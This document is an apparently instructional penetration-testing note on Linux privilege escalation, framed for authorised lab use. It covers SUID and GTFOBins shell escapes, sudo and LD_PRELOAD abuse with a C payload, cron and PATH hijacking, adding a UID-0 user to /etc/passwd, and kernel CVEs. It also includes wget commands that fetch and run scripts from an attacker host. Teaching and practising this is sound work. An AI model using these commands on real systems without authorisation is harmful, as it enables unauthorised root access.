### Linux Privilege Escalation

--> ⚠️ LEGAL / ETHICAL REMINDER: Everything below assumes you already have a low-privileged foothold shell on a target you own or have explicit written permission to test (Metasploitable2/3, TryHackMe/HackTheBox lab boxes, your own VMs). Privilege escalation techniques are extremely powerful — practicing them anywhere else is unauthorized access under laws like the CFAA or India's IT Act.

--> Privilege escalation ("privesc") is what you do AFTER gaining initial low-privilege access (notes 04/05) — the goal is moving from a limited user to root, or at minimum to a more useful/persistent account. It follows the same pattern as the overall methodology (note 01): enumerate exhaustively, identify a misconfiguration or vulnerability, exploit it, verify.

## The Privesc Mindset

--> The single most important habit: enumerate EVERYTHING before trying anything. Privesc is rarely one obvious flaw — it's usually a small, boring misconfiguration (a cron job, a sudo rule, a SUID binary) that only stands out once you've built a full picture of the system.
--> A repeatable manual enumeration checklist to run on any fresh foothold:
```bash
id                          # who am I, what groups am I in
hostname; uname -a           # exact kernel version - feeds kernel exploit search
cat /etc/os-release           # exact distro/version
sudo -l                       # what can I run as another user without a password / with a password I have
find / -perm -4000 -type f 2>/dev/null    # SUID binaries system-wide
find / -perm -2000 -type f 2>/dev/null    # SGID binaries
crontab -l; cat /etc/crontab; ls -la /etc/cron.*    # scheduled tasks
ps aux                        # running processes - what's running as root that I might interact with
netstat -tulpn 2>/dev/null    # listening ports, especially localhost-only services
cat /etc/passwd               # enumerate all local users, check for anything unusual
find / -writable -type d 2>/dev/null | grep -v -E "^/(proc|sys)"   # world-writable directories
```
--> This connects directly to note 02's `find / -perm -4000` introduction and note 05's Meterpreter mention of `post/multi/recon/local_exploit_suggester` — this note goes deep on exactly what to DO once you've found candidates.

## SUID/SGID Binaries and GTFOBins

--> SUID (Set User ID) on an executable means it runs with the FILE OWNER'S privileges, not the invoking user's — if root owns a SUID binary, running it as any user executes it AS root. SGID works the same way but for group ownership.
```bash
find / -perm -4000 -type f 2>/dev/null       # list every SUID binary on the box
find / -perm -4000 -type f -user root 2>/dev/null   # narrow to root-owned SUID binaries specifically - the interesting subset
```
```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/bin/nmap
```
--> Most entries here are legitimate and expected (`passwd` NEEDS to run as root to modify `/etc/shadow`). The finding is when a binary that CAN be abused to spawn a shell or read/write arbitrary files is SUID-root — `find` and `nmap` in that list above are both classic examples.

==> GTFOBins
--> GTFOBins (gtfobins.github.io) is a curated, community-maintained catalog of standard Unix binaries and the exact command needed to abuse each one for privilege escalation, file read/write bypass, or shell spawning — organized by exploitation TYPE (SUID, sudo, capabilities, etc.) per binary. Checking any unusual SUID binary against GTFOBins is a standard, near-automatic step.
```bash
# Example: find has a documented SUID abuse via its -exec flag
find . -exec /bin/sh -p \; -quit
# -p preserves the effective UID when spawning the shell - without it, modern bash/sh drop privileges automatically for SUID-spawned shells

# Example: nmap's old --interactive mode (legacy nmap versions) drops to a shell
nmap --interactive
nmap> !sh

# Example: vim/less/more (if SUID-root, or usable via sudo) can shell out
vim -c ':!/bin/sh'
```
--> The pattern to internalize, not just memorize the examples: any binary that can (a) execute arbitrary commands, (b) read/write arbitrary files, or (c) spawn a shell/editor session is a SUID privesc candidate if root owns it. GTFOBins exists precisely because this list is long and non-obvious — always check it rather than trying to remember every trick.

==> Linux Capabilities (a Modern SUID Alternative)
--> Capabilities let a binary get ONE specific root-level privilege (e.g. `cap_setuid`, raw socket access) without needing full SUID — worth checking too, since it's the same underlying idea and equally exploitable via GTFOBins' "Capabilities" section.
```bash
getcap -r / 2>/dev/null
```
```text
/usr/bin/python3.9 = cap_setuid+ep
```
--> `cap_setuid+ep` on python means you can literally call `os.setuid(0)` from a Python script run by ANY user and become root, since the binary itself already carries that capability.
```bash
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Sudo Misconfigurations

```bash
sudo -l          # lists commands the current user can run via sudo, and whether a password is required
```
```text
User haxor may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/vim
    (ALL) /usr/bin/systemctl restart apache2
```
--> `NOPASSWD: /usr/bin/vim` is an immediate win — no password needed, and vim is a documented GTFOBins sudo entry:
```bash
sudo vim -c ':!/bin/sh'      # spawn a root shell straight from vim, since it's running as root via sudo
```
--> Even commands that DO require a password are worth checking (you presumably know YOUR OWN password) — the vulnerability is the COMMAND being run as root, not the lack of a password prompt. Any entry granting `(ALL)` or `(root)` on a binary that appears in GTFOBins' "sudo" column is exploitable.
--> Wildcards and partial paths in sudoers are a subtler variant:
```text
(root) NOPASSWD: /usr/bin/find /var/log -name *.log
```
--> If a sudoers rule allows a command with attacker-controllable arguments (like `find` with an unrestricted path or flags), the same `find -exec` GTFOBins trick still applies:
```bash
sudo find /var/log -name test -exec /bin/sh \;
```
--> Also check for `LD_PRELOAD`/`env_keep` misconfigurations in `/etc/sudoers` (`sudo -l` shows `env_keep+=LD_PRELOAD` if set) — if the sudo policy preserves `LD_PRELOAD` from your environment, you can preload a malicious shared library into ANY sudo-run binary:
```c
// shell.c - minimal LD_PRELOAD payload
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/path/shell.so <any_permitted_sudo_command>
```

## Cron Job Hijacking

--> Cron jobs running AS ROOT that reference a script writable by your current user are a very common finding, especially on CTF-style boxes.
```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l -u root 2>/dev/null    # may fail without privileges, but worth trying
```
```text
*/5 * * * * root /opt/backup/cleanup.sh
```
```bash
ls -la /opt/backup/cleanup.sh     # check ownership/permissions of the SCRIPT itself, not just the crontab entry
```
--> If `cleanup.sh` is writable by your user (owner misconfigured, or a lazily-permissive `chmod 777`), you simply append a payload and wait for cron to fire it as root:
```bash
echo 'chmod u+s /bin/bash' >> /opt/backup/cleanup.sh    # or: cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
# wait up to 5 minutes for the next cron tick, then:
/bin/bash -p     # -p tells bash to NOT drop the SUID privilege it just gained
```
--> Also check for cron scripts that call OTHER binaries via a relative path or bare name without an absolute path (`tar`, `cp`, a custom script name) — this leads directly into PATH hijacking below, since cron often runs with a minimal/predictable `PATH`.

## PATH Hijacking

--> If a root-run script/cron job/SUID binary calls another program by name WITHOUT an absolute path (e.g. `tar` instead of `/bin/tar`), and your user can write to a directory that's earlier in the effective `PATH` for that context, you can plant a malicious binary of the same name.
```bash
echo $PATH                              # check YOUR current PATH ordering
cat /opt/backup/cleanup.sh              # e.g. this script internally just calls "tar czf ..." with no absolute path
```
```bash
# Craft a malicious "tar" that actually spawns a root shell, place it earlier in PATH
echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
# now trigger the vulnerable script/cron job - it resolves "tar" to /tmp/tar instead of /usr/bin/tar
```
--> This is exactly why writing scripts that call binaries by absolute path (`/usr/bin/tar` not `tar`) is a real hardening practice, not pedantry.

## The Writable `/etc/passwd` Trick

--> If `/etc/passwd` itself is writable by your user (rare, but shows up in deliberately vulnerable CTF boxes to teach this exact technique), you can append a brand-new root-equivalent user directly, since `/etc/passwd` is what defines UID/GID/shell — no need for `/etc/shadow` at all.
```bash
ls -la /etc/passwd            # check write permission first
openssl passwd -1 -salt xyz password123     # generate an MD5-crypt password hash for the new entry
```
```bash
echo 'newroot:$1$xyz$hashedpasswordhere:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot          # log in as the new user - UID 0 and GID 0 means fully root-equivalent, password known to you
```
--> The `0:0` fields are what matter — they set both UID and GID to 0 (root), regardless of the account's name.

## Kernel Exploits

--> When the userland-level checks above turn up nothing, an unpatched kernel vulnerability can escalate privileges directly, independent of any application misconfiguration.
```bash
uname -a                     # exact kernel version string, e.g. "5.8.0-63-generic"
cat /etc/os-release            # distro + version, needed because some kernel CVEs are distro-patched differently
```
--> Two well-known "class" examples worth understanding conceptually (not just as CVE numbers to memorize):
1. Dirty COW (CVE-2016-5195) — a race condition in the kernel's copy-on-write memory handling, allowing a local user to write to memory mappings that should be read-only, ultimately letting an unprivileged user overwrite files like `/etc/passwd` even without direct write permission. Affected a huge range of kernel versions for years before being patched.
2. Dirty Pipe (CVE-2022-0847) — a vulnerability in how the Linux kernel's pipe buffer handling interacts with page cache, allowing an unprivileged local user to overwrite data in supposedly read-only files (including files owned by root) that are page-cache-backed. Similar end effect to Dirty COW (arbitrary privileged file overwrite) via a different underlying bug.
--> Why version-matching matters enormously here: kernel exploits are extremely version/config sensitive — a PoC built for kernel 5.8.0 may segfault or simply fail silently on 5.8.3 with a backported fix, or on a different distro's patched kernel build. ALWAYS confirm the exact kernel version and check it against the specific CVE's affected-version range before attempting, and prefer testing in a snapshot-able VM first — a bad kernel exploit attempt can crash or corrupt the target.
```bash
searchsploit dirty cow                    # search local Exploit-DB mirror for matching kernel exploit PoCs
searchsploit linux kernel 5.8              # search by kernel version directly
```
--> Kernel exploits should generally be a LAST resort in a real engagement (higher risk of crashing a production system) — always exhaust the lower-risk misconfiguration checks above first.

## Automation Tools

--> Manual enumeration is essential to actually UNDERSTAND a box, but running an automated tool alongside it catches things a checklist misses and saves time on larger engagements.

==> LinPEAS
```bash
# transfer to target (many ways - here via a simple python http server on your attack box)
python3 -m http.server 8000                      # on attacker machine, in the directory containing linpeas.sh
wget http://<attacker_ip>:8000/linpeas.sh -O /tmp/linpeas.sh    # on target
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt      # tee so you can review the full output later, it's LONG
```
--> How to read LinPEAS output: it's colour-coded (red/yellow highlight = high-interest finding) and organized into clear sections. Skim top-to-bottom for anything highlighted in red first — these are near-certain privesc vectors (writable files owned by root, NOPASSWD sudo entries, known CVE-matched kernel version). Yellow is "worth a look, may be a dead end". The sheer VOLUME of output is the tool's biggest weakness — don't just run it and stare blankly, use it to confirm/prioritize what your manual checklist above already started narrowing down.

==> linux-exploit-suggester
```bash
wget http://<attacker_ip>:8000/linux-exploit-suggester.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
/tmp/les.sh
```
--> This tool specifically compares the target's kernel version and installed packages against a database of known kernel/userland CVEs, and lists matching exploits with a confidence rating ("Highly probable", "less probable") and, where available, a direct link/reference to the PoC exploit code. Cross-reference any "Highly probable" hit with `searchsploit` before attempting it, and always test in a way you can recover from (snapshot the VM) since kernel exploits can crash the box.

--> This closes out the "Gaining Access → Privilege Escalation" arc for Linux targets specifically — note 09 covers the equivalent Windows-side techniques, and both feed back into note 05's Metasploit post-exploitation workflow (`post/multi/recon/local_exploit_suggester` is Metasploit's own automated version of exactly what LinPEAS/linux-exploit-suggester do here).
